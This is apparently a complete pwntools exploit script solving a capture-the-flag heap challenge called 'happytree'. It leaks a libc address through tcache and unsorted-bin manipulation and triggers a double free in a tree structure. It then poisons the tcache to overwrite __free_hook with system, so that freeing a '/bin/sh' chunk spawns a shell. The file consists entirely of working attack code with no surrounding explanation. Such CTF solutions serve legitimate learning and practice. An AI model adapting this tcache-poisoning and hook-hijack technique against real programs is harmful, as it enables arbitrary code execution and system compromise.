from pwn import *
filename="./happytree"
libc_name="./libc.so.6"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def insert(sz, data):
    io.sendlineafter("cmd> ", "1")
    io.sendlineafter("data: ", str(sz))
    io.sendafter("content: ", data)

def dele(sz):
    io.sendlineafter("cmd> ", "2")
    io.sendlineafter("data: ", str(sz))

def show(sz):
    io.sendlineafter("cmd> ", "3")
    io.sendlineafter("data: ", str(sz))

def debug():
    gdb.attach(io,"brva 0xFBE")
    show(1)


for i in range(9):
    insert(0x98+i, 'a')

for i in range(8):
    dele(0x98+8-i)

for i in range(7):
    insert(0x99+i, 'a') # clear tcache
# debug()
insert(12,'a')
show(12)
libc_info = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x3ebd61
success("libc_base: " + hex(libc_base))

insert(8,'a')
# gdb.attach(io,"brva 0xE17")
insert(9,'b')
dele(8)
# debug()
insert(8,'a') # 8's right ptr is still at 9
dele(8) # 8's right will be cat to 9's left

# gdb.attach(io,"brva 0xE17")
insert(13, 'a')
dele(9)
dele(0) # the size has become 0(into tcache ,that's why this is so strange), cause double-free

insert(14,p64(libc_base+libc.symbols['__free_hook']))
insert(15,'/bin/sh\x00')
insert(16, p64(libc_base+libc.symbols['system'])) # hijack free_hook
# debug()
dele(15)
io.interactive()
